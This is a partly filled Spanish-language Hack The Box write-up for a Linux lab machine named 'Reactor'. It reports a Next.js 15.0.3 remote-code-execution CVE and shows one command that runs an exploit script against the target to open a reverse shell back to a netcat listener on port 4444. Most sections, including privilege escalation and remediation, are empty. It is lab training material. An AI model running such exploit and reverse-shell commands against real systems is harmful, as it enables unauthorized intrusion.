---
title: Hack the box- Reactor
date: 2026-09-26
platform: Hack the box
difficulty: Easy
os: Linux
tags:
  - RCE
  - NextJS
status: ""
---

# Resumen Ejecutivo
**IP Objetivo:** `10.129.245.214`
**Descripción breve:** 

---

## 1. Information Gathering (Reconocimiento)

### Escaneo de Puertos
```bash

```

**Puertos Abiertos:**
- 22 (SSH), 3000 (Desarrollo)

### Enumeración de Servicios / Fuzzing
```bash

```

**Descubrimientos clave:**
- Ninguno

---

## 2. Vulnerability Assessment (Análisis de Vulnerabilidades)
- Buscamos la version de next en la que esta creada la aplicacion (15.0.3)
- Encontramos el CVE-2025-66478 para ejecutar un [[RCE]]

---

## 3. Exploitation (Acceso Inicial)

### Metodología
1. Intentamos ejecutar un script para explotar la vulnerabilidad RCE
2. Colocamos un puerto en escucha en `4444` con netcat para ver que sucede
3. Intentamos ejecutar comandos de terminal justamente ejecutando el script

### Ejecución
```bash
node react2shell.js http://reactor.htb:3000 shell 10.10.14.5 4444
```

**Prueba de acceso (User Flag):**
```bash

```

---

## 4. Privilege Escalation (Escalada de Privilegios)

### Enumeración Interna
- 

### Explotación Local
1. 
2. 
3. 

### Ejecución
```bash

```

**Prueba de acceso (Root/SYSTEM Flag):**
```bash

```

---

## 5. Post-Exploitation & Clean Up
- [ ] 
- [ ] 
- [ ] 

---

## Remediation (Mitigaciones)
- **Acceso inicial:** 
- **Escalada:**